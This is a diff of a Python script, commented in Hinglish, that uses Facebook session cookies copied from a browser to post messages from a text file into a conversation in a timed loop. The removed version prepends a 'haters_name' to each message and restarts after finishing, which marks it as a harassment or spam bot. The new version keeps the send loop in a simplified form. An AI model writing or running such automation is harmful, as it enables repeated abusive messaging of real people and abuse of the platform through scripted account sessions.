@@ -1,71 +1,49 @@
 import requests
+import json
 import time
 import threading
+import os
 import random
 from platform import system
-import os
 
-def cls():
-    if system() == 'Linux':
-        os.system('clear')
-    elif system() == 'Windows':
-        os.system('cls')
+def parse_raw_cookie(raw_cookie_string):
+    cookies = {}
+    parts = raw_cookie_string.strip().split(';')
+    for item in parts:
+        if '=' in item:
+            k, v = item.strip().split('=', 1)
+            cookies[k.strip()] = v.strip()
+    return cookies
 
-def liness():
-    print('\u001B[37m' + '---------------------------------------------------')
+# 1. Read cookies from cookies.txt (browser se copy kari string paste karni hai)
+with open('cookies.txt', 'r') as f:
+    raw_cookie = f.read().strip()
+cookies = parse_raw_cookie(raw_cookie)
 
+# 2. Aapki main script logic yahan shuru karo
 def send_messages():
-    with open('cookies.json', 'r') as file:
-        import json
-        cookies = json.load(file)  # Should be a dict: {"c_user":"...", "xs":"...", ...}
+    # Example file reading (baaki logic aapka original jaise ho)
+    with open('FL.txt') as f:
+        fl_file = f.read().strip()
+    with open(fl_file) as f:
+        messages = [msg.strip() for msg in f if msg.strip()]
 
-    with open('IB.txt', 'r') as file:
-        convo_id = file.read().strip()
-
-    with open('FL.txt', 'r') as file:
-        text_file_path = file.read().strip()
-
-    with open(text_file_path, 'r') as file:
-        messages = file.readlines()
-    num_messages = len(messages)
-
-    with open('HN.txt', 'r') as file:
-        haters_name = file.read().strip()
-    with open('TM.txt', 'r') as file:
-        speed = int(file.read().strip())
-
+    # Example: Facebook API/endpoint URL (yahan apne logic ke mutabik daalna hoga)
+    url = "https://facebook.com/messages/send"  # apna endpoint
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-        'Accept': '*/*',
-        'Connection': 'keep-alive'
+        "User-Agent": "Mozilla/5.0"
+        # Baaki headers agar chahiye
     }
-
-    liness()
-    # NOTE: This endpoint and params are for illustration. You have to use endpoint sniffed from browser:
-    # For example: https://mbasic.facebook.com/messages/send/?icm=1
-    url = "https://mbasic.facebook.com/messages/send/"
-    for message_index in range(num_messages):
-        message = messages[message_index].strip()
-        data = {
-            'body': haters_name + ' ' + message,
-            'tids': convo_id,   # use correct keys from browser requests
-            # include other required form fields here like 'fb_dtsg', 'jazoest', etc.
+    for msg in messages:
+        payload = {
+            "message": msg
+            # Baaki params jo chahiye
         }
-        response = requests.post(url, headers=headers, cookies=cookies, data=data)
-        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-        if response.ok:
-            print(f"[+] Messages {message_index+1} of Convo {convo_id}: {message}")
-            print(f" - Time: {current_time}")
-            liness()
-        else:
-            print(f"[x] Failed to send message {message_index+1} of Convo {convo_id}: {message}")
-            print(f" - Time: {current_time}")
-            liness()
-        time.sleep(speed)
-    print("[+] All messages sent. Restarting the process...")
+        # Cookie dict pass karo
+        resp = requests.post(url, data=payload, headers=headers, cookies=cookies)
+        print(resp.status_code, resp.text)
+        time.sleep(2)  # Delay optional
 
-def main():
+# Main call yahan se
+if __name__ == "__main__":
     send_messages()
-
-if __name__ == '__main__':
-    main()
